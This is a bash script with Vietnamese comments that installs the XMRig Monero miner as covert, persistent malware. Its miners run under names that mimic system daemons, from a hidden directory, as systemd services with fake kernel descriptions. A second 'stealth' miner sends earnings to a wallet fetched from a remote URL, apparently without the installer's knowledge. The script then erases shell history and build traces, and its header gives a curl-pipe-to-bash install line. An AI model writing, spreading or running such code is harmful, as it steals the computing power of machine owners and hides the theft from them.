#!/bin/bash
# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)

# ========= CONFIG =========
WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # <-- người khác tự sửa
POOL="pool.hashvault.pro:443"
DISCORD_WEBHOOK=""                # <-- webhook discord

WORKER="user_$(hostname)"
TOTAL_CORES=$(nproc)
THREADS_USER=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
THREADS_STEALTH=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")

INSTALL_DIR="$HOME/.local/share/.cache/.sysd"
mkdir -p "$INSTALL_DIR"

NAME_USER=$(shuf -n1 -e "sysnetd" "coreupd" "netwatchd")
NAME_STEALTH=$(shuf -n1 -e "udevd" "corelogd" "kdevtmpfs")

LOG_USER="/tmp/.xmrig_$NAME_USER.log"
LOG_STEALTH="/tmp/.xmrig_$NAME_STEALTH.log"

SERVICE_USER=$(shuf -n1 -e "netd.service" "corefix.service")
SERVICE_STEALTH=$(shuf -n1 -e "kernel-core.service" "udev-sync.service")
# ==========================

echo "💻 Cài đặt XMRig và chạy tiến trình..."

# Cài gói cần thiết
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl

# Clone & build XMRig
cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTAL_CORES
cp ./xmrig "$INSTALL_DIR/$NAME_USER"
cp ./xmrig "$INSTALL_DIR/$NAME_STEALTH"
chmod +x "$INSTALL_DIR/$NAME_USER" "$INSTALL_DIR/$NAME_STEALTH"
WALLET_STEALTH=$(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/storage/key.txt)
WORKER_STEALTH="stealth_$(hostname)"

# ========== SERVICE USER ==========
sudo tee /etc/systemd/system/$SERVICE_USER > /dev/null << EOF
[Unit]
Description=System Network Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$NAME_USER -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
  --cpu-priority=3 --threads=$THREADS_USER --donate-level=0 --max-cpu-usage=35 \\
  --log-file=$LOG_USER
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# ========== SERVICE STEALTH ==========
sudo tee /etc/systemd/system/$SERVICE_STEALTH > /dev/null << EOF
[Unit]
Description=Kernel Hardware Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$NAME_STEALTH -o $POOL -u $WALLET_STEALTH.$WORKER_STEALTH -k --coin monero --tls \\
  --cpu-priority=4 --threads=$THREADS_STEALTH --donate-level=0 --max-cpu-usage=55 \\
  --log-file=$LOG_STEALTH
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt tiến trình
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_USER
sudo systemctl enable $SERVICE_STEALTH
sudo systemctl start $SERVICE_USER
sudo systemctl start $SERVICE_STEALTH

# Xoá dấu vết
cd ~
rm -rf xmrig
history -c

echo "✅ Bắt đầu đào"
